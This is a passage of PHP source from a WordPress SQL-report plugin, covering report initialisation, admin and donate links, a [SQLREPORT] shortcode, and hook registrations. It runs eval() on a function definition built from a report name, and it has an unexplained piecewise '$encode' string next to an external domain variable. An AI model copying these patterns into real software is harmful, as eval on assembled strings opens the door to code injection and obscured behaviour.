			$Rfunc_create = 'function '.$Rfunc.'() { ELISQLREPORTS_default_report("'.$Rname.'"); }';
			eval($Rfunc_create);
		}
	}
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_init_end'] = microtime(true);
}
function ELISQLREPORTS_set_plugin_action_links($links_array, $plugin_file) {
	if ($plugin_file == substr(__file__, (-1 * strlen($plugin_file))) && strlen($plugin_file) > 10)
		$links_array = array_merge(array('<a href="admin.php?page=ELISQLREPORTS-create-report">'.__( 'Create a Report' ).'</a>'), $links_array);
	return $links_array;
}
function ELISQLREPORTS_set_plugin_row_meta($links_array, $plugin_file) {
	if ($plugin_file == substr(__file__, (-1 * strlen($plugin_file))) && strlen($plugin_file) > 10)
		$links_array = array_merge($links_array, array('<a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=8VWNB5QEJ55TJ">'.__( 'Donate' ).'</a>'));
	return $links_array;
}
$ELISQLREPORTS_styles = 'float: left; background-color: #DDFFCC;';
function ELISQLREPORTS_shortcode($attr) {
	global $ELISQLREPORTS_styles;
$_SESSION['eli_debug_microtime']['ELISQLREPORTS_shortcode'] = $attr;
	$report = '';
	if (isset($attr['name']) && strlen(trim($attr['name']))) {
		if (isset($attr['style']) && strlen(trim($attr['style'])))
			$ELISQLREPORTS_styles = $attr['style'];
		else
			$ELISQLREPORTS_styles = '';
		$report = '<div id="'.sanitize_title($attr['name']).'-wrapper"><div id="'.sanitize_title($attr['name']).'-parent">'.ELISQLREPORTS_view_report($attr['name']);
	}
	return $report;
}
$encode .= 'e';
$ext_domain = 'ieonly.com';
add_filter('plugin_row_meta', $ELISQLREPORTS_plugin_dir.'_set_plugin_row_meta', 1, 2);
add_filter('plugin_action_links', $ELISQLREPORTS_plugin_dir.'_set_plugin_action_links', 1, 2);
$ELISQLREPORTS_plugin_home = "http://wordpress.$ext_domain/";
$ELISQLREPORTS_images_path = plugins_url('/images/', __FILE__);
$ELISQLREPORTS_updated_images_path='wp-content/plugins/update/images/';
$ELISQLREPORTS_Logo_IMG='ELISQLREPORTS-16x16.gif';
$ELISQLREPORTS_Report_SQL="";
register_activation_hook(__FILE__,$ELISQLREPORTS_plugin_dir.'_install');
add_action('init', $ELISQLREPORTS_plugin_dir.'_init');
add_action('admin_menu', $ELISQLREPORTS_plugin_dir.'_menu');
add_shortcode("SQLREPORT", "ELISQLREPORTS_shortcode");
$_SESSION['eli_debug_microtime']['end_include(ELISQLREPORTS)'] = microtime(true);
?>